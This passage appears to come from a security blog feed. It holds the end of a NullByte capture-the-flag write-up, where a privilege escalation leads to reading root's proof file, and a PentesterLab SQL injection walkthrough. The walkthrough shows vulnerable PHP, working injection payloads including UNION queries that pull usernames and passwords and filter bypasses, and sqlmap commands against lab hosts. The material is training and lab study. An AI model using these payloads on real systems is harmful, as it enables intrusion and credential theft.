+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ramses@NullByte:/var/www/backup$ ./procwatch
+</span><span class='line'>uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>id&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>cd /root&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>ls -l&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>total 4
+</span><span class='line'>-rw-r&ndash;r&ndash; 1 root root 1170 Aug  2 01:45 proof.txt</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Catch the flag <code>proof.txt</code>.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>cat proof.txt&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>adf11c7a9e6523e630aaf3b9b7acb51d&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>It seems that you have pwned the box, congrats.
+</span><span class='line'>Now you done that I wanna talk with you. Write a walk &amp; mail at
+</span><span class='line'>&lt;a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#120;&#x6c;&#x79;&#48;&#110;&#x40;&#x73;&#105;&#103;&#x61;&#x69;&#110;&#116;&#46;&#111;&#x72;&#103;">&#120;&#x6c;&#121;&#48;&#x6e;&#x40;&#x73;&#x69;&#x67;&#x61;&#105;&#110;&#116;&#x2e;&#x6f;&#114;&#103;&lt;/a> attach the walk and proof.txt
+</span><span class='line'>If sigaint.org is down you may mail at &lt;a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#x6e;&#98;&#115;&#x6c;&#121;&#48;&#110;&#64;&#x67;&#109;&#x61;&#105;&#108;&#46;&#99;&#x6f;&#x6d;">&#110;&#98;&#115;&#108;&#x79;&#48;&#110;&#64;&#103;&#109;&#x61;&#105;&#x6c;&#46;&#x63;&#x6f;&#109;&lt;/a>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>USE THIS PGP PUBLIC KEY&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>&mdash;&ndash;BEGIN PGP PUBLIC KEY BLOCK&mdash;&ndash;
+</span><span class='line'>Version: BCPG C# v1.6.1.0&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
+</span><span class='line'>Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
+</span><span class='line'>e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
+</span><span class='line'>Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+</span><span class='line'>+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
+</span><span class='line'>YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
+</span><span class='line'>Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
+</span><span class='line'>HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
+</span><span class='line'>m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
+</span><span class='line'>XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
+</span><span class='line'>kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
+</span><span class='line'>TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
+</span><span class='line'>Gms=
+</span><span class='line'>=PiAQ
+</span><span class='line'>&mdash;&ndash;END PGP PUBLIC KEY BLOCK&mdash;&ndash;</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Done and cheers Ly0n!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[[PentesterLab] Web for Pentester - SQL Injection]]></title>
+    <link href="http://f4l13n5n0w.github.io/blog/2015/05/22/pentesterlab-web-for-pentester-sql-injection/"/>
+    <updated>2015-05-22T05:53:28-04:00</updated>
+    <id>http://f4l13n5n0w.github.io/blog/2015/05/22/pentesterlab-web-for-pentester-sql-injection</id>
+    <content type="html"><![CDATA[<p>&ldquo;This course details all you need to know to start doing web penetration testing. PentesterLab tried to put together the basics of web testing and a summary of the most common vulnerabilities with the LiveCD to test them.&rdquo; &ndash; PentesterLab</p>
+
+<p>Due to this is quite a long course, I have to divide the course into several parts and this one is focus on SQL Injection attack. More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/web_for_pentester/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">course</a> is highly recommanded to read.</p>
+
+<p>Difficulty: 1 / 5</p>
+
+<!-- more -->
+
+
+<h2>Example 1</h2>
+
+<p>Code review:
+<figure class='code'><figcaption><span>example1.php </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
+</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
+</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">name</span><span class="o">=&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
+</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
+</span><span class='line'>    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>There is no input validation on parameter <em>$_GET[&ldquo;name&rdquo;]</em>, so I can exploit it directly with the injection payload: <code>' or 1=1-- -</code>. After injection, the variable <em>$sql</em> will become <code>SELECT * FROM users where name='' or 1=1-- -'</code> which will return all the entries in table users.</p>
+
+<p>PoC:</p>
+
+<p><code>http://10.10.10.129/sqli/example1.php?name=root' or 1=1-- -</code></p>
+
+<p>SQLMAP exploit:</p>
+
+<p><code>sqlmap -u "http://10.10.10.129/sqli/example1.php?name=root" --dbs --banner</code></p>
+
+<h2>Example 2</h2>
+
+<p>Code review:
+<figure class='code'><figcaption><span>example2.php </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
+</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span> <span class="o">/&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
+</span><span class='line'>        <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ERROR</span> <span class="nx">NO</span> <span class="nx">SPACE</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">name</span><span class="o">=&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
+</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'><span class="o">...</span> <span class="o">...</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>From the source code above, we know that the developer filtered SPACE in user input. However we can use comment /**/ or TAB/HT (%09, URL encoded) to bypass space filter.</p>
+
+<p>PoC:</p>
+
+<p><code>http://10.10.10.129/sqli/example2.php?name=root'%09and%09'1'='1</code></p>
+
+<p><code>http://10.10.10.129/sqli/example2.php?name=root'/**/union/**/select/**/1,(select/**/name/**/from/**/users/**/limit/**/3,1),(select/**/passwd/**/from/**/users/**/limit/**/3,1),4,5/**/and/**/'1'='2</code></p>
+
+<p><img class="left" src="/downloads/webforpentester_sqli/1.png"></p>
+
+<p>SQLMAP exploit:
+In sqlmap, we can set parameter &ldquo;<em><font color="red">&ndash;tamper=space2comment</font></em>&rdquo; to replace space with comment.</p>
+
+<p><code>sqlmap -u "http://10.10.10.129/sqli/example2.php?name=root" --dbs --tamper=space2comment</code></p>
+
+<h2>Example 3</h2>
+
+<p>Code review:
+<figure class='code'><figcaption><span>example3.php </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
+</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nx">\s</span><span class="o">+/&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
+</span><span class='line'>        <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ERROR</span> <span class="nx">NO</span> <span class="nx">SPACE</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">name</span><span class="o">=&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
+</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'><span class="o">...</span> <span class="o">...</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>This time the developer use <a href="http://php.net/manual/en/regexp.reference.escape.php">PCRE regex (<strong><em>\s+</em></strong>)</a> to filter one or more sequential spaces (which including TAB/HT). However, I still can use comment <code>/**/</code> to bypass this filter.</p>
+
+<p>PoC:</p>
+
+<p><code>http://10.10.10.129/sqli/example3.php?name=root'/**/union/**/select/**/1,(select/**/name/**/from/**/users/**/limit/**/3,1),(select/**/passwd/**/from/**/users/**/limit/**/3,1),4,5/**/and/**/'1'='2</code></p>
+
+<p>SQLMAP exploit:</p>
+
+<p><code>sqlmap -u "http://10.10.10.129/sqli/example3.php?name=root" --dbs --tamper=space2comment</code></p>
+
+<h2>Example 4</h2>
+
+<p>Code review:
+<figure class='code'><figcaption><span>example4.php </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
+</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
+</span><span class='line'>    <span class="nv">$sql</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">id</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
+</span><span class='line'>    <span class="nv">$sql</span><span class="o">.=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;])</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
+</span><span class='line'>    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>This time the developer use function &ldquo;<em><a href="http://php.net/manual/en/function.mysql-real-escape-string.php">mysql_real_escape_string</a></em>&rdquo; to prevent SQL injection from the following characters <code>\x00, \n, \r, \, ', " and \x1a</code></p>
+
+<p>However, in this case, &lsquo;id&rsquo; is used as integrate number which is not quoted by <code>'</code>, it is still vulnerable to SQL injection.</p>
+
+<p>PoC:</p>
+
+<p><code>http://10.10.10.129/sqli/example4.php?id=2 or 1=1</code></p>
+
+<p>SQLMAP exploit:</p>
+
+<p><code>sqlmap -u "http://10.10.10.129/sqli/example4.php?id=2" --dbs</code></p>
+
+<h2>Example 5</h2>
+
+<p>Code review:
+<figure class='code'><figcaption><span>example5.php </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
+</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/^</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+/&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
+</span><span class='line'>        <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ERROR</span> <span class="nx">INTEGER</span> <span class="nx">REQUIRED</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">id</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
+</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span> <span class="p">;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'><span class="o">...</span> <span class="o">...</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>&ldquo;I guess the beginning of the story &hellip;&hellip; But I didn&rsquo;t expect the end of the story.&rdquo; &ndash; Shakespeare</p>
+
+<p>The incorrect regular expression failed to protect SQL injection, it only make sure the input of <em><font color="red">id</font></em> is start from integrate number but it could be followed by everything.</p>
+
+<p>PoC:</p>
+
+<p><code>http://10.10.10.129/sqli/example5.php?id=2 or 1=1</code></p>
+
+<p>SQLMAP exploit:</p>
+
+<p><code>sqlmap -u "http://10.10.10.129/sqli/example5.php?id=2" --dbs</code></p>
+
+<h2>Example 6</h2>
+
+<p>Code review:
+<figure class='code'><figcaption><span>example6.php </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
+</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+</span><span class="err">$</span><span class="o">/&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
+</span><span class='line'>        <span class="k">die</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ERROR</span> <span class="nx">INTEGER</span> <span class="nx">REQUIRED</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">/&gt;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="nv">$sql</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">SELECT</span> <span class="o">*</span> <span class="nx">FROM</span> <span class="nx">users</span> <span class="nx">where</span> <span class="nx">id</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
+</span><span class='line'>    <span class="nv">$sql</span> <span class="o">.=</span> <span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span> <span class="p">;</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'><span class="o">...</span> <span class="o">...</span>
+</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;?&gt;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>The incorrect regular expression failed to protect SQL injection, it only make sure the input of <em><font color="red">id</font></em> is end by integrate number but the injection still happened.</p>
+
+<p>PoC:</p>
+
+<p><code>http://10.10.10.129/sqli/example6.php?id=2 or 1=1</code></p>
+
+<p>SQLMAP exploit:</p>
+
+<p><code>sqlmap -u "http://10.10.10.129/sqli/example6.php?id=2" --dbs</code></p>
+
+<h2>Example 7</h2>
+
+<p>Code review:
+<figure class='code'><figcaption><span>example7.php </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
+</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/^-?</span><span class="p">[</span><span class="mi">0</span><span class="o">-</span><span class="mi">9</span><span class="p">]</span><span class="o">+</span><span class="err">$</span><span class="o">/</span><span class="nx">m</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
